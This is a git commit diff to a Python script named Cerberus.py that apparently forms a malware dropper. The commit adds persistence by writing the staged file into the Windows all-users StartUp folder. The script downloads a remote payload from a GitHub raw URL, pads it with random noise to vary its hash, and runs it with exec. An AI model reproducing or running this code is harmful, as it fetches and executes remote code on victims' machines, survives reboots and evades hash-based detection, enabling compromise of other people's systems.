f5ca79f42e6e14667d966020cc94eac3d124ea14
Param Kudle <paramdkudle@gmail.com>
2024-07-25 16:53:33 +0530

    Added to Startup

--- Cerberus.py
+++ Cerberus.py
@@ -5,8 +5,15 @@ import urllib.request
 
 length = random.randrange(100,1000)
 poly = True
+startup = True
 
-path = ("/Users/" + str(os.getlogin()) + "/AppData/Local/Temp/Stage1Host.py")
+if startup == True:
+    global path
+    path = ("C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp")
+    
+else:
+    global path
+    path = ("/Users/" + str(os.getlogin()) + "/AppData/Local/Temp")
 
 def noise(length):
     rNoise = ""
@@ -16,16 +23,16 @@ def noise(length):
 
 rN = noise(length)
 
-if os.path.isfile(path) == False:   # Creates the Stage 1 File if it doesn't exist
-    file = open('Stage1Host.py', 'a')
+if os.path.isfile((path + "/Stage1Host.py")) == False:   # Creates the Stage 1 File if it doesn't exist
+    file = open((path + "/Stage1Host.py"), 'a')
     file.close()
 
 
 # Retrieves code from URL and appends it into Stage1 created earlier 
 with urllib.request.urlopen("https://raw.githubusercontent.com/paramkudle/Cerberus/main/Stage1.txt") as retrieve:
     data = retrieve.read().decode("utf-8")
-    with open(path, "a+") as file:
+    with open((path + "/Stage1Host.py"), "a+") as file:
         file.write("#" + rN + "\n" + str(data) + "\n" + "#" + rN)
 
 # Runs the Stage1 file
-exec(open(path).read())
+exec(open((path + "/Stage1Host.py")).read())
